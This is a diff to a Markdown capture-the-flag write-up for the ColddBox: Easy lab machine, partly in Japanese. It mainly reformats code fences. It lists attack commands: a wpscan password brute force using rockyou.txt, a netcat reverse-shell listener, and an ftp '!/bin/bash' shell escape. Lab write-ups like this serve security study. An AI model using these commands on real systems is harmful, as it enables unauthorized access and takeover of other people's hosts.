@@ -30,14 +30,12 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (not recorded in PDF)
 
-```
 
 ## Nmap
-```
+
 
 ### Not implemented (not recorded in PDF)
 
-```
 
 ### 2. Local Shell
 
@@ -46,7 +44,7 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 PDFメモから抽出した主要コマンドと要点を整理しています。必要に応じて後続で詳細追記してください。
 
 ### 実行コマンド（抽出）
-```
+```bash
 python3 ~/tool/search.py
 wpscan --url http://$ip/ --passwords /usr/share/wordlists/rockyou.txt
 nc -lvnp 3333
@@ -58,7 +56,7 @@ ftp> !/bin/bash
 画像抽出なし（PDF内に有効な埋め込み画像なし）
 
 ### 抽出メモ（先頭120行）
-```
+```bash
 ColddBox: Easy
 June 29, 2023 0:57
 
@@ -183,7 +181,6 @@ Checking Config Backups - Time: 00:00:07 <=====================================>
 
 ### Not implemented (not recorded in PDF)
 
-```
 
 💡 Why this works  
 Initial access succeeds when enumeration findings are turned into a practical exploit chain. Capturing credentials, file disclosure, or direct RCE creates reliable pivot points for privilege escalation.
